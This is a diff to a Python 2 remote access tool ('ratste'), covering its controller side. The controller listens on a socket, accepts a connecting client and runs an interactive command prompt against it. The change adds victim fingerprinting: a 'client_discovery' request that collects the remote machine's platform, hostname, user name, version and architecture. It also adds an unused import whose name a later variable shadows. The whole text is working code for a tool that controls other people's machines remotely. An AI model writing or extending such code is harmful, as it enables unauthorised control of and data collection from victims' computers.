@@ -22,6 +22,7 @@ __author__ = "https://github.com/StefanoRatto/"
 __license__ = "GPLv3"
 __version__ = "1.0.0"
 
+from platform import python_build
 import socket
 import sys
 
@@ -50,13 +51,17 @@ def main():
 
     conn, _ = s.accept()
 
-    conn.send('hostname')
-    client = conn.recv(4096).rstrip()
-    
-    print 'ratste > check-in by {}'.format(client)
+    conn.send('client_discovery')
+    clientInfo = conn.recv(4096).rstrip()
+    platform, hostname, user, version, arch = clientInfo.split('|')
+
+    print 'ratste > check-in by {}@{}'.format(user, hostname)
+    print 'Platform: {}'.format(platform)
+    print 'Version: {}'.format(version)
+    print 'Architecture: {}\n'.format(arch)
 
     while True:
-        cmd = raw_input('ratste@{} > '.format(client)).rstrip()
+        cmd = raw_input('ratste ~ {}@{} > '.format(user, hostname)).rstrip()
 
         # allow noop
         if cmd == '':
